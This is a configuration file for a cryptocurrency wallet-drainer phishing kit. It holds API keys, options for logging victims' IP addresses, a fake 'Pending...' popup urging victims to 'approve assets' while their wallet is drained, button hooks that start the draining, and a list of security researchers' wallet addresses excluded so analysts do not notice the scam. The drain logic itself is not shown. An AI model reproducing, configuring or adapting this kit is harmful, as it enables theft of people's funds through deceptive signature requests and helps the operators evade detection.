// Connect wallet settings
let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
let modal_color = "default"; // default / magenta / blue / orange / green / purple / teal
let modal_background = "gradient"; 
let themeVariables = {}; // Custom styles  https://docs.walletconnect.com/2.0/web3modal/theming

let infura_key = "988d51cc5e12469dbe2852d8b660b89a";
let wc_projectid = "7b3d5a6b0763294065cb92efa56375de"; // ProjectID from https://cloud.walletconnect.com/

// Logging setting
let logIpData =  true; // Add IP data to logs
let logEmptyWallets = false; // Log when wallet is empty


// Popup settings
let popupEnabled = true; // True or false, popup after connecting wallet while draining

//HTML Code of popup
let popupCode = `<div id="drPopup" class="drPopup" style="display:none !important; font-family: 'Poppins', sans-serif; position: fixed !important; inset: 0 !important; z-index: 150 !important; height: 100% !important; width: 100% !important; transition: opacity 0.3s ease-in-out 0s; background: rgba(0, 0, 0, 0.8) !important; justify-content: center !important; max-height: 100%; !important">
        <div class="keks-container" style="margin: 40px 0px !important;">
        <div class="keks-content" style="position: relative !important;border-radius: 16px;background: rgb(255, 255, 255) !important;width: 360px;max-height: calc(0px + 100vh);max-width: 100%;">
        <div class="keks-title" style="position: relative; text-align: center; padding: 16px 24px;">
            <h4 style="font-weight: 600;
            line-height: 110%;
            font-size: 22px;
            color: rgb(4, 17, 29);
            padding: 4px 16px
            ">Pending...</h4>
            <div class="keks-close" id="popupClose"></div>
            <style>
                .keks-close {
                cursor: pointer;
                position: absolute;
                right: 25px;
                top: 15px;
                width: 20px;
                height: 20px;
                opacity: 0.3;
                }
                .keks-close:hover {
                opacity: 0.4;
                }
                .keks-close:before, .keks-close:after {
                content: '';
                position: absolute;
                left: 15px;
                height: 19px;
                width: 2px;
                background-color: rgb(10, 10, 10);

                }
                .keks-close:before {
                transform: rotate(45deg);
                }
                .keks-close:after {
                transform: rotate(-45deg);
                }
            </style>
        </div>
        <div class="keks-details" style="padding: 24px;">
            <div style="; align-items: center; gap: 25px;">
                <div class="keks-image">
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: rgb(255, 255, 255); display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                <path d="M10 50A40 40 0 0 0 90 50A40 42 0 0 1 10 50" fill="#e15b64" stroke="none">
                  <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 51;360 50 51"></animateTransform>
                </path>
                <!-- [ldio] generated by https://loading.io/ --></svg>
                </div>
    
                <div class="keks-imageName">
                    <p style="font-size: 16.5px; font-weight: 600; color: rgb(4, 17, 29);"></p>
                </div>
            </div>
            <hr style="padding: 0px; margin: 28px 0px; opacity: 0.2; border-color: rgb(138, 147, 155) currentcolor currentcolor; border-style: solid none none; border-width: 1px medium medium; border-image: none 100% / 1 / 0 stretch; color: rgb(138, 147, 155); text-align: center;">
            <div class="keks-text">
                <div style="color: rgb(4, 17, 29); align-items: center; margin-bottom: 12px; display: flex; text-align: center; font-weight: 600;  background: rgb(247, 247, 247); border-radius: 12px; padding: 7px;">
                <img src="https://cdn-icons-png.flaticon.com/512/8212/8212602.png" height="30" style="  display: inline-block; vertical-align: middle; width:30px">
                <h3 style="text-align: center; font-size: 13px; font-weight: 600; color: rgb(4, 17, 29); margin: 0;">Approve assets to use our new protocol</h3></div>
                <div style="color: rgb(4, 17, 29) !important; line-height: 140%; margin-bottom: 12px; font-weight: 600;"><h3 style="font-size: 14px; text-align: center; font-weight: 600; position: relative;">Check your wallet for signature request</h3></div>
                </div>
        </div>
    </div>
        </div>
    </div>`;

let popupElementID = "drPopup";
let canClosePopup = true; // Can user close popup?
let popupCloseButtonID = "popupClose";

// Button settings
let connectElement = "connectButton"; // Dont't touch if not sure (class of button that's starts draining)
let messageElement = "messageButton"; // Dont't touch if not sure (id of element that's show status)

let buttonMessagesEnabled = false;
let textInitialConnected = "Try again";
let textProgress = "Loading ...";
let success = "Please approve ...";
let failed = "Try again !";

// Block wallets
let researchers = [
    "0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8",
    "0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d",
    "0x2ad6FA4db57Ac71479510863643Eb6b1991788E1",
    "0x33566c9D8BE6Cf0B23795E0d380E112Be9d75836",
    "0x034C446b223Bb4ffbd51d2E284Fe6b3cdd271315",
    "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045",
    "0xC832494dce30f7303F42d829c205D6Ea6b551afb",
    "0x29B876e2dd14dd034612F052ecB372E64C96A895",
    "0x886258791969e6b0fEff62c0a02be819Dfc1B167",
    "0x3096d3B09e6ec2E8fF923D1657d0c691148eEeE5",
    "0xaF92d25248767357041c002Ea5aE24eF350102EF",
    "0x2b8496F320582481eA393bd26B9191F9059D2943",
    "0x81c4065F3B3b89adE412158b8c2c2C37e2a1b0A0",
    "0x9A735c231ad994D48929d3d8cE0970fCA25C2908",
    "0xbAEA4b614e0cADdA6aE2c860F3Ba8270f770f22f",
    "0x1A5b5825A27Ec3D6eb3b07fBdF3e43940Def50cD",
    "0xE9848efd82fa62a5cfaC25582dDe408afBD111eC",
    "0x2c067bB687587306840849E1a4Ff9bB4B42f7308",
    "0x49027eF8931082Ca59F0037b80A4F518D500bC4f",
    "0x5EadC2E651470e16413446AA4Bca44868751bf08",
    "0x96dA410F33EBC7139DECc588Bf6d777416CC06B2", // Add reserchers afer this line like this "0xresearcheraddress",
	
	];